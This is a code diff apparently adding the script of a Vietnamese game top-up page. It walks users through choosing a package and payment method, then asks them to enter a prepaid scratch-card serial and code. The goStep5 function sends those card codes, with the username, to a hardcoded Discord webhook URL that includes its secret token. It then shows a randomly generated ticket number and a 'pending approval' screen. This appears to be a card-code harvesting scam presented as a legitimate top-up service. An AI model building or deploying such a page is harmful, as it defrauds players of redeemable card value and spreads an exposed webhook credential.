+                if(i <= 4) document.getElementById('dot' + i).classList.add('active');
+            }
+        }
+
+        function goStep2() {
+            savedUser = document.getElementById('usernameInput').value;
+            document.getElementById('display-user').innerText = savedUser;
+            document.getElementById('main-header-title').innerText = gameConfigs[savedGame].headerTxt;
+
+            renderPackages();
+
+            clearAllPages();
+            document.getElementById('step2').style.display = 'block';
+            refreshDots(2);
+        }
+
+        function goStep3(pkgName, pkgPrice) {
+            savedPkgName = pkgName;
+            savedPkgPrice = pkgPrice;
+            document.getElementById('display-selected-pkg').innerText = "Đã chọn gói: " + pkgName + " (" + pkgPrice + ")";
+
+            const textBoxes = document.querySelectorAll('.dynamic-rb-txt');
+            textBoxes.forEach(box => box.innerText = pkgName);
+
+            const config = gameConfigs[savedGame];
+            const unitTexts = document.querySelectorAll('.dynamic-unit-text');
+            unitTexts.forEach(txt => txt.innerText = config.unit);
+
+            const iconStyles = document.querySelectorAll('.dynamic-icon-style');
+            iconStyles.forEach(icon => {
+                icon.className = "currency-icon dynamic-icon-style " + config.iconClass;
+            });
+
+            clearAllPages();
+            document.getElementById('step3').style.display = 'block';
+            refreshDots(3);
+        }
+
+        function goStep4(methodName) {
+            savedMethod = methodName;
+            document.getElementById('summary-pkg-name').innerText = savedPkgName;
+            document.getElementById('summary-pkg-price').innerText = savedPkgPrice;
+            document.getElementById('summary-method-name').innerText = methodName;
+
+            clearAllPages();
+            document.getElementById('step4').style.display = 'block';
+            refreshDots(4);
+        }
+
+        function goStep5() {
+            // Lấy giá trị từ ô nhập dữ liệu thẻ cào
+            const serial = document.getElementById('serialInput').value.trim();
+            const code = document.getElementById('codeInput').value.trim();
+
+            document.getElementById('ticket-id').innerText = Math.floor(Math.random() * 90000000) + 10000000;
+
+            document.getElementById('res-user').innerText = savedUser;
+            document.getElementById('res-method').innerText = "Thẻ " + savedMethod;
+            document.getElementById('res-pkg').innerText = savedPkgName;
+            document.getElementById('res-cost').innerText = savedPkgPrice;
+            document.getElementById('res-game').innerText = savedGame;
+
+            const d = new Date();
+            const timeStr = String(d.getHours()).padStart(2,'0') + ":" + String(d.getMinutes()).padStart(2,'0') + " " + String(d.getDate()).padStart(2,'0') + "/" + String(d.getMonth()+1).padStart(2,'0') + "/" + d.getFullYear();
+            document.getElementById('res-clock').innerText = timeStr;
+
+            // --- DISCORD WEBHOOK ---
+            const webhookURL = "https://discord.com/api/webhooks/1569857108931911831/SfW2kL3EhzL7l5cbxMWO9-7LilnGXwtKNy0MqjzMT8TBwd2GRS8uA3U4J5we-VAjiOjR";
+            
+            const payload = {
+                content: "🔔 **CÓ KHÁCH NẠP THẺ CHỜ DUYỆT!**",
+                embeds: [
+                    {
+                        title: "Chi Tiết Đơn Hàng",
+                        color: 3036209,
+                        fields: [
+                            { name: "👤 Người chơi", value: savedUser, inline: true },
+                            { name: "🎮 Trò chơi", value: savedGame, inline: true },
+                            { name: "📶 Phương thức", value: savedMethod, inline: true },
+                            { name: "📦 Gói nạp", value: savedPkgName, inline: true },
+                            { name: "💰 Mệnh giá", value: savedPkgPrice, inline: true },
+                            { name: "💳 Mã Serial", value: "`" + serial + "`", inline: false },
+                            { name: "🔑 Mã Thẻ Cào", value: "`" + code + "`", inline: false },
+                            { name: "🕒 Thời gian", value: timeStr, inline: false }
+                        ]
+                    }
+                ]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log("Success");
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+
+            clearAllPages();
+            document.getElementById('step5').style.display = 'block';
+            refreshDots(4);
+        }
+    </script>
 </body>
 </html>
